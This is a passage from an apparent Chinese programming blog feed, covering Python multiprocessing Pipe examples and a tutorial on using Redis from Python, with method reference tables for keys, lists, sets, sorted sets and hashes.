异常</p><p>常用方法:</p><table><thead><tr><th><code>send(obj)</code></th><th>将一个对象发送到连接的另外一端</th></tr></thead><tbody><tr><td><code>recv()</code></td><td>返回一个由另一端<code>send()</code>的对象,该方法会一直阻塞直到接收到对象,如果对端关闭了连接,或者没有东西可以接受,将抛出<code>EOFError</code></td></tr><tr><td><code>fileno</code></td><td>返回由连接对象使用的描述符</td></tr><tr><td><code>close()</code></td><td>关闭连接对象</td></tr><tr><td><code>poll()</code></td><td>返回连接对象是否有可以读取的数据.</td></tr></tbody></table></blockquote><h4 id="1-主进程和子进程管道通信"><a href="#1-主进程和子进程管道通信" class="headerlink" title="1.主进程和子进程管道通信"></a>1.主进程和子进程管道通信</h4><blockquote><p>需要注意的是,管道在建立的时候自动连接了主进程,不管是使用全双工,还是半双工,都需要对主进程的管道进行处理.</p><p>在全双工模式中,假设主进程是发送端,子进程是接收端</p><pre><code class="python"><code class="language-python">con1, con2 = multiprocessing.Pipe([duplex])</code></pre><p><code>Pipe()</code> 返回的是管道的两端,两端每个对象都有<code>send()</code>和<code>recv()</code> 方法(还有其他方法),例如在全双工模式下,可以用<code>con1.send()</code> 发送消息,<code>con2.recv()</code>接受消息,如果没有消息可以接受,<code>recv()</code>方法会一直阻塞,如果管道已经关闭,<code>recv()</code> 会抛出<code>EOFError</code> 异常</p><p>常用方法:</p><table><thead><tr><th><code>send(obj)</code></th><th>将一个对象发送到连接的另外一端</th></tr></thead><tbody><tr><td><code>recv()</code></td><td>返回一个由另一端<code>send()</code>的对象,该方法会一直阻塞直到接收到对象,如果对端关闭了连接,或者没有东西可以接受,将抛出<code>EOFError</code></td></tr><tr><td><code>fileno</code></td><td>返回由连接对象使用的描述符</td></tr><tr><td><code>close()</code></td><td>关闭连接对象</td></tr><tr><td><code>poll()</code></td><td>返回连接对象是否有可以读取的数据.</td></tr></tbody></table></blockquote><h4 id="1-主进程和子进程管道通信"><a href="#1-主进程和子进程管道通信" class="headerlink" title="1.主进程和子进程管道通信"></a>1.主进程和子进程管道通信</h4><blockquote><p>需要注意的是,管道在建立的时候自动连接了主进程,不管是使用全双工,还是半双工,都需要对主进程的管道进行处理.</p><p>在全双工模式中,假设主进程是发送端,子进程是接收端</p><pre><code class="python">"""全双工管道"""import multiprocessing,timedef child_process(pipe):while True:  try:      time.sleep(1)      num = pipe.recv()      print('子进程:{},接收:{}'.format(multiprocessing.current_process().name, num))      print('pipe管道状态', pipe.poll())  except Exception:      print('如果一端被关闭,另外一端接收完毕后,会报错')      breakif __name__ == '__main__':"""主进程"""recv_pipe, send_pipe = multiprocessing.Pipe(duplex=True)# 主进程即是发送端,也是接收端for i in range(5):  send_pipe.send(i)  print("主进程Pipe发送:{}".format(i))# 发送完毕后,关闭通道send_pipe.close()child_process_pipe = multiprocessing.Process(target=child_process, args=(recv_pipe, ))child_process_pipe.start()child_process_pipe.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">主进程Pipe发送:0主进程Pipe发送:1主进程Pipe发送:2主进程Pipe发送:3主进程Pipe发送:4子进程:Process-1,接收:0pipe管道状态 True子进程:Process-1,接收:1pipe管道状态 True子进程:Process-1,接收:2pipe管道状态 True子进程:Process-1,接收:3pipe管道状态 True子进程:Process-1,接收:4pipe管道状态 True如果一端被关闭,另外一端接收完毕后,会报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反之,主进程也能当接收端,子进程当发送端.</p><p>关闭管道后,<code>try</code> 语句用于处理产生的<code>EOFError</code> 异常</p></blockquote><h4 id="2-主进程闲置-2个子进程一发一收"><a href="#2-主进程闲置-2个子进程一发一收" class="headerlink" title="2.主进程闲置,2个子进程一发一收"></a>2.主进程闲置,2个子进程一发一收</h4><blockquote><p>在全双工模式下,就算主进程闲置,主进程也连接在管道的一端,既可以在接收端,也可以在发送端.需要自己去选择把握.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">proc1</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'send: %s'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>  pipe<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pipe.send 发送数据</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pipe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">proc2</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc2 recv:'</span><span class="token punctuation">,</span> pipe<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pipe.recv 用与接收数据</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pipe1<span class="token punctuation">,</span> pipe2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>proc1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>proc2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 在主进程端把发送pipe关闭</span>pipe1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>p2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭管道后,<code>try</code> 语句用于处理产生的<code>EOFError</code> 异常</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python操作redis</title>
      <link href="/posts/15055.html"/>
      <url>/posts/15055.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="Python操作redis"><a href="#Python操作redis" class="headerlink" title="Python操作redis"></a>Python操作redis</h2><h3 id="1-安装python支持包"><a href="#1-安装python支持包" class="headerlink" title="1.安装python支持包"></a>1.安装<code>python</code>支持包</h3><blockquote><p>安装<code>redis</code> 的扩展包</p><pre class="line-numbers language-bash"><code class="language-bash">$ pip <span class="token function">install</span> redis  <span class="token comment" spellcheck="true"># 操作包</span>$ pip <span class="token function">install</span> redis-dump   <span class="token comment" spellcheck="true"># 导入导出操作</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="2-打开redis-的ip-连接"><a href="#2-打开redis-的ip-连接" class="headerlink" title="2.打开redis 的ip 连接"></a>2.打开<code>redis</code> 的<code>ip</code> 连接</h3><blockquote><p>默认的<code>redis</code> 的绑定地址是<code>127.0.0.1</code> ,如果要通过其他机器去连接服务器,需要设定服务器的<code>redis.conf</code> 中绑定服务器自己的<code>ip</code> 地址.</p><pre class="line-numbers language-bash"><code class="language-bash">$ vim  redis.conf<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token comment" spellcheck="true"># 指定服务器的自己ip地址</span>bind 127.0.0.1   192.168.0.101<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重启服务器</p><pre class="line-numbers language-bash"><code class="language-bash">$ ./redis-server redis.conf$ <span class="token function">ps</span> -aux <span class="token operator">|</span> <span class="token function">grep</span> redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="3-Python-操作"><a href="#3-Python-操作" class="headerlink" title="3.Python 操作"></a>3.<code>Python</code> 操作</h3><blockquote><p><code>redis</code> 的包提供了2个类(<code>Redis</code>,<code>StrictRedis</code>) 来操作数据库.<code>StrictRedis</code>实现了绝大部分的官方命令,比如<code>set()</code>对应了<code>redis set</code> 方法.而<code>Redis</code> 是<code>StrictRedis</code> 的子类,它的主要功能是用于向后兼容旧版本库的几个方法.为了兼容,有一些方法做了改写.</p><p>官方推荐使用的是<code>StrictRedis</code> .</p></blockquote><h4 id="1-连接redis"><a href="#1-连接redis" class="headerlink" title="1.连接redis"></a>1.连接<code>redis</code></h4><blockquote><p>当前环境:</p><ul><li><code>redis</code>服务器 :192.168.0.101,并绑定了<code>IP</code>地址,没有设置密码.</li></ul><p>客户端的连接:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> redis <span class="token keyword">import</span> StrictRedis<span class="token comment" spellcheck="true"># 创建连接</span>redis <span class="token operator">=</span> StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数接受很多的参数,可以根据实际的情况指定参数.</p><pre class="line-numbers language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span>                 db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> password<span class="token operator">=</span>None<span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span>None<span class="token punctuation">,</span>                 socket_connect_timeout<span class="token operator">=</span>None<span class="token punctuation">,</span>                 socket_keepalive<span class="token operator">=</span>None<span class="token punctuation">,</span> socket_keepalive_options<span class="token operator">=</span>None<span class="token punctuation">,</span>                 connection_pool<span class="token operator">=</span>None<span class="token punctuation">,</span> unix_socket_path<span class="token operator">=</span>None<span class="token punctuation">,</span>                 encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> encoding_errors<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">,</span>                 charset<span class="token operator">=</span>None<span class="token punctuation">,</span> errors<span class="token operator">=</span>None<span class="token punctuation">,</span>                 decode_responses<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> retry_on_timeout<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>                 ssl<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> ssl_keyfile<span class="token operator">=</span>None<span class="token punctuation">,</span> ssl_certfile<span class="token operator">=</span>None<span class="token punctuation">,</span>                 ssl_cert_reqs<span class="token operator">=</span><span class="token string">'required'</span><span class="token punctuation">,</span> ssl_ca_certs<span class="token operator">=</span>None<span class="token punctuation">,</span>                 max_connections<span class="token operator">=</span>None<span class="token punctuation">,</span> single_connection_client<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>                 health_check_interval<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来可以测试连接成功与否:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> redis <span class="token keyword">import</span> StrictRedis<span class="token comment" spellcheck="true"># 创建连接</span>redis <span class="token operator">=</span> StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">)</span>redis<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string">'test for redis'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""运行后打印出b'test for redis'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-key-操作"><a href="#2-key-操作" class="headerlink" title="2.key 操作"></a>2.<code>key</code> 操作</h4><blockquote><p><code>key</code>操作和<code>redis</code>的原生命令几乎一样:</p><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">参数说明</th><th align="left">示例</th><th align="left">示例说明</th><th align="left">示例结果</th></tr></thead><tbody><tr><td align="left">exists(name)</td><td align="left">判断一个键是否存在</td><td align="left">name：键名</td><td align="left">redis.exists(‘name’)</td><td align="left">是否存在name这个键</td><td align="left">True</td></tr><tr><td align="left">delete(name)</td><td align="left">删除一个键</td><td align="left">name：键名</td><td align="left">redis.delete(‘name’)</td><td align="left">删除name这个键</td><td align="left">1</td></tr><tr><td align="left">type(name)</td><td align="left">判断键类型</td><td align="left">name：键名</td><td align="left">redis.type(‘name’)</td><td align="left">判断name这个键类型</td><td align="left">b’string’</td></tr><tr><td align="left">keys(pattern)</td><td align="left">获取所有符合规则的键</td><td align="left">pattern：匹配规则</td><td align="left">redis.keys(‘n*’)</td><td align="left">获取所有以n开头的键</td><td align="left">[b’name’]</td></tr><tr><td align="left">randomkey()</td><td align="left">获取随机的一个键</td><td align="left"></td><td align="left">randomkey()</td><td align="left">获取随机的一个键</td><td align="left">b’name’</td></tr><tr><td align="left">rename(src, dst)</td><td align="left">重命名键</td><td align="left">src：原键名；dst：新键名</td><td align="left">redis.rename(‘name’, ‘nickname’)</td><td align="left">将name重命名为nickname</td><td align="left">True</td></tr><tr><td align="left">dbsize()</td><td align="left">获取当前数据库中键的数目</td><td align="left"></td><td align="left">dbsize()</td><td align="left">获取当前数据库中键的数目</td><td align="left">100</td></tr><tr><td align="left">expire(name, time)</td><td align="left">设定键的过期时间，单位为秒</td><td align="left">name：键名；time：秒数</td><td align="left">redis.expire(‘name’, 2)</td><td align="left">将name键的过期时间设置为2秒</td><td align="left">True</td></tr><tr><td align="left">ttl(name)</td><td align="left">获取键的过期时间，单位为秒，-1表示永久不过期</td><td align="left">name：键名</td><td align="left">redis.ttl(‘name’)</td><td align="left">获取name这个键的过期时间</td><td align="left">-1</td></tr><tr><td align="left">move(name, db)</td><td align="left">将键移动到其他数据库</td><td align="left">name：键名；db：数据库代号</td><td align="left">move(‘name’, 2)</td><td align="left">将name移动到2号数据库</td><td align="left">True</td></tr><tr><td align="left">flushdb()</td><td align="left">删除当前选择数据库中的所有键</td><td align="left"></td><td align="left">flushdb()</td><td align="left">删除当前选择数据库中的所有键</td><td align="left">True</td></tr><tr><td align="left">flushall()</td><td align="left">删除所有数据库中的所有键</td><td align="left"></td><td align="left">flushall()</td><td align="left">删除所有数据库中的所有键</td><td align="left">True</td></tr></tbody></table></blockquote><h4 id="3-列表操作"><a href="#3-列表操作" class="headerlink" title="3.列表操作"></a>3.列表操作</h4><blockquote><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">参数说明</th><th align="left">示例</th><th align="left">示例说明</th><th align="left">示例结果</th></tr></thead><tbody><tr><td align="left">rpush(name, *values)</td><td align="left">在键为name的列表末尾添加值为value的元素，可以传多个</td><td align="left">name：键名；values：值</td><td align="left">redis.rpush(‘list’, 1, 2, 3)</td><td align="left">向键为list的列表尾添加1、2、3</td><td align="left">3，列表大小</td></tr><tr><td align="left">lpush(name, *values)</td><td align="left">在键为name的列表头添加值为value的元素，可以传多个</td><td align="left">name：键名；values：值</td><td align="left">redis.lpush(‘list’, 0)</td><td align="left">向键为list的列表头部添加0</td><td align="left">4，列表大小</td></tr><tr><td align="left">llen(name)</td><td align="left">返回键为name的列表的长度</td><td align="left">name：键名</td><td align="left">redis.llen(‘list’)</td><td align="left">返回键为list的列表的长度</td><td align="left">4</td></tr><tr><td align="left">lrange(name, start, end)</td><td align="left">返回键为name的列表中start至end之间的元素</td><td align="left">name：键名；start：起始索引；end：终止索引</td><td align="left">redis.lrange(‘list’, 1, 3)</td><td align="left">返回起始索引为1终止索引为3的索引范围对应的列表</td><td align="left">[b’3’, b’2’, b’1’]</td></tr><tr><td align="left">ltrim(name, start, end)</td><td align="left">截取键为name的列表，保留索引为start到end的内容</td><td align="left">name：键名；start：起始索引；end：终止索引</td><td align="left">ltrim(‘list’, 1, 3)</td><td align="left">保留键为list的索引为1到3的元素</td><td align="left">True</td></tr><tr><td align="left">lindex(name, index)</td><td align="left">返回键为name的列表中index位置的元素</td><td align="left">name：键名；index：索引</td><td align="left">redis.lindex(‘list’, 1)</td><td align="left">返回键为list的列表索引为1的元素</td><td align="left">b’2’</td></tr><tr><td align="left">lset(name, index, value)</td><td align="left">给键为name的列表中index位置的元素赋值，越界则报错</td><td align="left">name：键名；index：索引位置；value：值</td><td align="left">redis.lset(‘list’, 1, 5)</td><td align="left">将键为list的列表中索引为1的位置赋值为5</td><td align="left">True</td></tr><tr><td align="left">lrem(name, count, value)</td><td align="left">删除count个键的列表中值为value的元素</td><td align="left">name：键名；count：删除个数；value：值</td><td align="left">redis.lrem(‘list’, 2, 3)</td><td align="left">将键为list的列表删除两个3</td><td align="left">1，即删除的个数</td></tr><tr><td align="left">lpop(name)</td><td align="left">返回并删除键为name的列表中的首元素</td><td align="left">name：键名</td><td align="left">redis.lpop(‘list’)</td><td align="left">返回并删除名为list的列表中的第一个元素</td><td align="left">b’5’</td></tr><tr><td align="left">rpop(name)</td><td align="left">返回并删除键为name的列表中的尾元素</td><td align="left">name：键名</td><td align="left">redis.rpop(‘list’)</td><td align="left">返回并删除名为list的列表中的最后一个元素</td><td align="left">b’2’</td></tr><tr><td align="left">blpop(keys, timeout=0)</td><td align="left">返回并删除名称在keys中的list中的首个元素，如果列表为空，则会一直阻塞等待</td><td align="left">keys：键列表；timeout： 超时等待时间，0为一直等待</td><td align="left">redis.blpop(‘list’)</td><td align="left">返回并删除键为list的列表中的第一个元素</td><td align="left">[b’5’]</td></tr><tr><td align="left">brpop(keys, timeout=0)</td><td align="left">返回并删除键为name的列表中的尾元素，如果list为空，则会一直阻塞等待</td><td align="left">keys：键列表；timeout：超时等待时间，0为一直等待</td><td align="left">redis.brpop(‘list’)</td><td align="left">返回并删除名为list的列表中的最后一个元素</td><td align="left">[b’2’]</td></tr><tr><td align="left">rpoplpush(src, dst)</td><td align="left">返回并删除名称为src的列表的尾元素，并将该元素添加到名称为dst的列表头部</td><td align="left">src：源列表的键；dst：目标列表的key</td><td align="left">redis.rpoplpush(‘list’, ‘list2’)</td><td align="left">将键为list的列表尾元素删除并将其添加到键为list2的列表头部，然后返回</td><td align="left">b’2’</td></tr></tbody></table></blockquote><h4 id="4-集合操作"><a href="#4-集合操作" class="headerlink" title="4.集合操作"></a>4.集合操作</h4><blockquote><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">参数说明</th><th align="left">示例</th><th align="left">示例说明</th><th align="left">示例结果</th></tr></thead><tbody><tr><td align="left">sadd(name, *values)</td><td align="left">向键为name的集合中添加元素</td><td align="left">name：键名；values：值，可为多个</td><td align="left">redis.sadd(‘tags’, ‘Book’, ‘Tea’, ‘Coffee’)</td><td align="left">向键为tags的集合中添加Book、Tea和Coffee这3个内容</td><td align="left">3，即插入的数据个数</td></tr><tr><td align="left">srem(name, *values)</td><td align="left">从键为name的集合中删除元素</td><td align="left">name：键名；values：值，可为多个</td><td align="left">redis.srem(‘tags’, ‘Book’)</td><td align="left">从键为tags的集合中删除Book</td><td align="left">1，即删除的数据个数</td></tr><tr><td align="left">spop(name)</td><td align="left">随机返回并删除键为name的集合中的一个元素</td><td align="left">name：键名</td><td align="left">redis.spop(‘tags’)</td><td align="left">从键为tags的集合中随机删除并返回该元素</td><td align="left">b’Tea’</td></tr><tr><td align="left">smove(src, dst, value)</td><td align="left">从src对应的集合中移除元素并将其添加到dst对应的集合中</td><td align="left">src：源集合；dst：目标集合；value：元素值</td><td align="left">redis.smove(‘tags’, ‘tags2’, ‘Coffee’)</td><td align="left">从键为tags的集合中删除元素Coffee并将其添加到键为tags2的集合</td><td align="left">True</td></tr><tr><td align="left">scard(name)</td><td align="left">返回键为name的集合的元素个数</td><td align="left">name：键名</td><td align="left">redis.scard(‘tags’)</td><td align="left">获取键为tags的集合中的元素个数</td><td align="left">3</td></tr><tr><td align="left">sismember(name, value)</td><td align="left">测试member是否是键为name的集合的元素</td><td align="left">name：键值</td><td align="left">redis.sismember(‘tags’, ‘Book’)</td><td align="left">判断Book是否是键为tags的集合元素</td><td align="left">True</td></tr><tr><td align="left">sinter(keys, *args)</td><td align="left">返回所有给定键的集合的交集</td><td align="left">keys：键列表</td><td align="left">redis.sinter([‘tags’, ‘tags2’])</td><td align="left">返回键为tags的集合和键为tags2的集合的交集</td><td align="left">{b’Coffee’}</td></tr><tr><td align="left">sinterstore(dest, keys, *args)</td><td align="left">求交集并将交集保存到dest的集合</td><td align="left">dest：结果集合；keys：键列表</td><td align="left">redis.sinterstore(‘inttag’, [‘tags’, ‘tags2’])</td><td align="left">求键为tags的集合和键为tags2的集合的交集并将其保存为inttag</td><td align="left">1</td></tr><tr><td align="left">sunion(keys, *args)</td><td align="left">返回所有给定键的集合的并集</td><td align="left">keys：键列表</td><td align="left">redis.sunion([‘tags’, ‘tags2’])</td><td align="left">返回键为tags的集合和键为tags2的集合的并集</td><td align="left">{b’Coffee’, b’Book’, b’Pen’}</td></tr><tr><td align="left">sunionstore(dest, keys, *args)</td><td align="left">求并集并将并集保存到dest的集合</td><td align="left">dest：结果集合；keys：键列表</td><td align="left">redis.sunionstore(‘inttag’, [‘tags’, ‘tags2’])</td><td align="left">求键为tags的集合和键为tags2的集合的并集并将其保存为inttag</td><td align="left">3</td></tr><tr><td align="left">sdiff(keys, *args)</td><td align="left">返回所有给定键的集合的差集</td><td align="left">keys：键列表</td><td align="left">redis.sdiff([‘tags’, ‘tags2’])</td><td align="left">返回键为tags的集合和键为tags2的集合的差集</td><td align="left">{b’Book’, b’Pen’}</td></tr><tr><td align="left">sdiffstore(dest, keys, *args)</td><td align="left">求差集并将差集保存到dest集合</td><td align="left">dest：结果集合；keys：键列表</td><td align="left">redis.sdiffstore(‘inttag’, [‘tags’, ‘tags2’])</td><td align="left">求键为tags的集合和键为tags2的集合的差集并将其保存为inttag`</td><td align="left">3</td></tr><tr><td align="left">smembers(name)</td><td align="left">返回键为name的集合的所有元素</td><td align="left">name：键名</td><td align="left">redis.smembers(‘tags’)</td><td align="left">返回键为tags的集合的所有元素</td><td align="left">{b’Pen’, b’Book’, b’Coffee’}</td></tr><tr><td align="left">srandmember(name)</td><td align="left">随机返回键为name的集合中的一个元素，但不删除元素</td><td align="left">name：键值</td><td align="left">redis.srandmember(‘tags’)</td><td align="left">随机返回键为tags的集合中的一个元素</td><td align="left"></td></tr></tbody></table></blockquote><h4 id="5-有序集合操作"><a href="#5-有序集合操作" class="headerlink" title="5.有序集合操作"></a>5.有序集合操作</h4><blockquote><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">参数说明</th><th align="left">示例</th><th align="left">示例说明</th><th align="left">示例结果</th></tr></thead><tbody><tr><td align="left">zadd(name, *args, **kwargs)</td><td align="left">向键为name的zset中添加元素member，score用于排序。如果该元素存在，则更新其顺序</td><td align="left">name： 键名；args：可变参数</td><td align="left">redis.zadd(‘grade’, 100, ‘Bob’, 98, ‘Mike’)</td><td align="left">向键为grade的zset中添加Bob（其score为100），并添加Mike（其score为98）</td><td align="left">2，即添加的元素个数</td></tr><tr><td align="left">zrem(name, *values)</td><td align="left">删除键为name的zset中的元素</td><td align="left">name：键名；values：元素</td><td align="left">redis.zrem(‘grade’, ‘Mike’)</td><td align="left">从键为grade的zset中删除Mike</td><td align="left">1，即删除的元素个数</td></tr><tr><td align="left">zincrby(name, value, amount=1)</td><td align="left">如果在键为name的zset中已经存在元素value，则将该元素的score增加amount；否则向该集合中添加该元素，其score的值为amount</td><td align="left">name：key名；value：元素；amount：增长的score值</td><td align="left">redis.zincrby(‘grade’, ‘Bob’, -2)</td><td align="left">键为grade的zset中Bob的score减2</td><td align="left">98.0，即修改后的值</td></tr><tr><td align="left">zrank(name, value)</td><td align="left">返回键为name的zset中元素的排名，按score从小到大排序，即名次</td><td align="left">name：键名；value：元素值</td><td align="left">redis.zrank(‘grade’, ‘Amy’)</td><td align="left">得到键为grade的zset中Amy的排名</td><td align="left">1</td></tr><tr><td align="left">zrevrank(name, value)</td><td align="left">返回键为name的zset中元素的倒数排名（按score从大到小排序），即名次</td><td align="left">name：键名；value：元素值</td><td align="left">redis.zrevrank(‘grade’, ‘Amy’)</td><td align="left">得到键为grade的zset中Amy的倒数排名</td><td align="left">2</td></tr><tr><td align="left">zrevrange(name, start, end, withscores=False)</td><td align="left">返回键为name的zset（按score从大到小排序）中index从start到end的所有元素</td><td align="left">name：键值；start：开始索引；end：结束索引；withscores：是否带score</td><td align="left">redis.zrevrange(‘grade’, 0, 3)</td><td align="left">返回键为grade的zset中前四名元素</td><td align="left">[b’Bob’, b’Mike’, b’Amy’, b’James’]</td></tr><tr><td align="left">zrangebyscore(name, min, max, start=None, num=None, withscores=False)</td><td align="left">返回键为name的zset中score在给定区间的元素</td><td align="left">name：键名；min：最低score；max：最高score； start：起始索引；num：个数；withscores：是否带score</td><td align="left">redis.zrangebyscore(‘grade’, 80, 95)</td><td align="left">返回键为grade的zset中score在80和95之间的元素</td><td align="left">[b’Bob’, b’Mike’, b’Amy’, b’James’]</td></tr><tr><td align="left">zcount(name, min, max)</td><td align="left">返回键为name的zset中score在给定区间的数量</td><td align="left">name：键名；min：最低score；max：最高score</td><td align="left">redis.zcount(‘grade’, 80, 95)</td><td align="left">返回键为grade的zset中score在80到95的元素个数</td><td align="left">2</td></tr><tr><td align="left">zcard(name)</td><td align="left">返回键为name的zset的元素个数</td><td align="left">name：键名</td><td align="left">redis.zcard(‘grade’)</td><td align="left">获取键为grade的zset中元素的个数</td><td align="left">3</td></tr><tr><td align="left">zremrangebyrank(name, min, max)</td><td align="left">删除键为name的zset中排名在给定区间的元素</td><td align="left">name：键名；min：最低位次；max：最高位次</td><td align="left">redis.zremrangebyrank(‘grade’, 0, 0)</td><td align="left">删除键为grade的zset中排名第一的元素</td><td align="left">1，即删除的元素个数</td></tr><tr><td align="left">zremrangebyscore(name, min, max)</td><td align="left">删除键为name的zset中score在给定区间的元素</td><td align="left">name：键名；min：最低score；max：最高score</td><td align="left">redis.zremrangebyscore(‘grade’, 80, 90)</td><td align="left">删除score在80到90之间的元素</td><td align="left">1，即删除的元素个数</td></tr></tbody></table></blockquote><h4 id="6-hash-操作"><a href="#6-hash-操作" class="headerlink" title="6.hash 操作"></a>6.<code>hash</code> 操作</h4><blockquote><table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">参数说明</th><th align="left">示例</th><th align="left">示例说明</th><th align="left">示例结果</th></tr></thead><tbody><tr><td align="left">hset(name, key, value)</td><td align="left">向键为name的散列表中添加映射</td><td 